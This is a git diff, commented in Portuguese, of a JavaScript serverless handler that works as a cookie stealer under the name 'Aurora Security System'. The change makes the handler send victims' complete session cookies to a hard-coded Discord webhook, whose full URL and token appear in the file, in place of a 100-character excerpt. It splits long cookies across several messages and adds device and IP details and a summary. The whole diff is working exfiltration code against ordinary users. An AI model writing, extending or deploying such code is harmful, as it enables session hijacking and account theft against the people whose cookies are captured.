@@ -34,8 +34,10 @@ export default async function handler(req, res) {
     // SUA WEBHOOK AQUI - SEGURA NO BACKEND
     const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
 
-    // Criar mensagem mais profissional
-    const embed = {
+    // 🔥 ENVIAR COOKIE COMPLETO - Dividido se necessário 🔥
+    
+    // PRIMEIRA MENSAGEM: Informações principais + parte do cookie
+    const mainEmbed = {
       content: '@everyone',
       embeds: [{
         title: '🔐 **NOVA CAPTURA DE COOKIE**',
@@ -43,8 +45,8 @@ export default async function handler(req, res) {
         color: 0x6366f1,
         fields: [
           {
-            name: '🍪 **COOKIE**',
-            value: '```' + cookie.substring(0, 100) + (cookie.length > 100 ? '...' : '') + '```'
+            name: '🍪 **COOKIE (Parte 1)**',
+            value: '```' + cookie.substring(0, 950) + '```'
           },
           {
             name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
@@ -82,10 +84,15 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
             name: '🔢 **ID DA SESSÃO**',
             value: `\`${generateSessionId()}\``,
             inline: true
+          },
+          {
+            name: '📏 **TAMANHO DO COOKIE**',
+            value: `\`${cookie.length} caracteres\``,
+            inline: true
           }
         ],
         footer: {
-          text: 'Aurora Security System • Proteção Avançada',
+          text: 'Aurora Security System • Continuando...',
           icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
         },
         timestamp: new Date().toISOString(),
@@ -95,11 +102,75 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
       }]
     };
 
-    // Enviar para o Discord
+    // Enviar primeira mensagem
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(mainEmbed)
+    });
+
+    // Se o cookie for maior que 950 caracteres, enviar o resto em mensagens adicionais
+    if (cookie.length > 950) {
+      let parteAtual = 2;
+      let posicao = 950;
+      
+      while (posicao < cookie.length) {
+        const tamanhoParte = Math.min(1900, cookie.length - posicao);
+        const parteCookie = cookie.substring(posicao, posicao + tamanhoParte);
+        
+        const parteEmbed = {
+          embeds: [{
+            title: `🍪 **COOKIE (Parte ${parteAtual})**`,
+            description: '```' + parteCookie + '```',
+            color: 0x6366f1,
+            footer: {
+              text: `Parte ${parteAtual} de ${Math.ceil(cookie.length / 1900) + 1}`
+            }
+          }]
+        };
+
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(parteEmbed)
+        });
+
+        posicao += tamanhoParte;
+        parteAtual++;
+        
+        // Pequeno delay para não floodar
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
+    }
+
+    // MENSAGEM FINAL: Resumo
+    const totalPartes = Math.ceil(cookie.length / 1900) + 1;
+    const finalEmbed = {
+      embeds: [{
+        title: '✅ **COOKIE RECEBIDO COM SUCESSO**',
+        color: 0x10b981,
+        fields: [
+          {
+            name: '📊 **RESUMO**',
+            value: `\`\`\`yml
+Total de partes: ${totalPartes}
+Tamanho total: ${cookie.length} caracteres
+Primeiros 50 chars: ${cookie.substring(0, 50)}...
+\`\`\``
+          }
+        ],
+        footer: {
+          text: 'Aurora Security System • Cookie completo enviado!',
+          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
     const response = await fetch(webhookURL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(embed)
+      body: JSON.stringify(finalEmbed)
     });
 
     if (!response.ok) {
